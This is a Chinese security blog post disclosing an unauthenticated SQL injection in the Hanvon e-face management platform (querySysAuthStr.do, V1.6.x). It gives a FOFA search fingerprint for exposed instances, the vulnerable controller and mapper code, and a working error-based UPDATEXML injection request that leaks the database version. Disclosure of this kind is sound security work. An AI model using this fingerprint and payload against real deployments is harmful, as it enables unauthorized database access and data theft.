---
title: "汉王e脸通综合管理平台 querySysAuthStr.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-querySysAuthStr-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querysysauthstr.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 querySysAuthStr.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/8 08:22
- 658浏览
- [0评论](#comment)
- 43分钟阅读

深入探索

SQL

应用程序

应用

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `querySysAuthStr.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

网络安全培训

云安全解决方案

防火墙软件

直接看 `SysAuthStrController` 里关于 `querySysAuthStr` 的实现

```
@ResponseBody
@RequestMapping(
    value = {"/querySysAuthStr.do"},
    method = {RequestMethod.GET}
)
public RequestJson querySysAuthStr(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "cardId") String cardId, @RequestParam(required = false,value = "userName") String userName, @RequestParam(required = false,value = "checkState") Integer checkState, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
    RequestJson result = new RequestJson();

    try {
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        SysAuthStrParam param = new SysAuthStrParam();
        param.setUserName(userName);
        if (null != cardId && !"".equals(cardId)) {
            param.setCardId(cardId);
        }

        param.setStart(start);
        param.setEnd(end);
        param.setCheckState(checkState);
        if (null != columnKey && columnKey.equals("sz_employ_id")) {
            columnKey = "SU." + columnKey;
        }

        param.setColumnKey(columnKey);
        param.setOrder(order);
        Long currUserId = TheApp.getCurrentUser().getId();
        param.setCurrUserId(currUserId);
        PageHelper.startPage(page, pageSize);
        List<SysAuthStrTpm> list = this.sysAuthStrAsm.querySysAuthStr(param);
```

深入探索

文件大小转换

传输层安全性协议

授权

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 SysAuthStrDsm.xml

代码安全审计

```
<select id="querySysAuthStr" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingRoomParam" resultMap="BaseResultMap2">
    SELECT SAS.ID, SAS.USER_ID, SU.SZ_NAME AS USERNAME, SU.SZ_CARD_ID AS CARDID, SAS.FACEDATE_PHOTO, SAS.BRANCH_ID, SAS.CHECK_STATE, SAS.CREATE_TIME  AS CREATETIME,
    SAS.CHECK_ID, SAS.CHECK_TIME, SAS.DELETE_STATE, SAS.TYPE, SAS.COMMENT, SB.SZ_NAME AS BRANCHNAME,
    CASE WHEN SAS.CHECK_ID = 0 THEN '自动审核' ELSE SU1.SZ_NAME END AS CHECKNAME,SU.SZ_EMPLOY_ID AS EMPLOYID
    FROM SYS_AUTH_STR SAS
    LEFT JOIN SYS_USER SU ON SAS.USER_ID = SU.NG_ID
    LEFT JOIN SYS_USER SU1 ON SAS.CHECK_ID = SU1.NG_ID
    LEFT JOIN SYS_BRANCH SB ON SAS.BRANCH_ID = SB.NG_ID
    WHERE 1 = 1
    <if test="userName != null">
      and SU.SZ_NAME like CONCAT('%',#{userName},'%')
    </if>
    <if test="cardId != null">
      and (SU.SZ_CARD_ID like CONCAT('%',#{cardId},'%')
      OR SU.SZ_EMPLOY_ID like CONCAT('%',#{cardId},'%'))
    </if>
    <if test="checkState != null">
      and SAS.CHECK_STATE = #{checkState}
    </if>
    <if test="start != null">
      and SAS.CREATE_TIME  &gt;= #{start}
    </if>
    <if test="end != null">
      and #{end} &gt;= SAS.CREATE_TIME
    </if>
    <if test="currUserId != null">
      AND SB.NG_ID IN (
        SELECT DISTINCT NG_BRANCH_ID
        FROM SYS_BRANCH_ROLE BR
        INNER JOIN SYS_ROLE R ON BR.NG_ROLE_ID = R.NG_ID
        INNER JOIN SYS_USER_ROLE UR ON UR.NG_ROLE_ID = R.NG_ID
        WHERE UR.NG_USER_ID = #{currUserId})
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      SAS.CREATE_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/sysAuthStr/querySysAuthStr.do?columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT/**/(ELT(2920=2920,1)))),8357))&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 querySysAuthStr.do SQL注入漏洞](images/img-001-36815c0c610d.webp)](https://image.mrxn.net/52296e8f30e544128fc1072a64691b21.webp)

成功通过报错注入爆出数据库版本信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
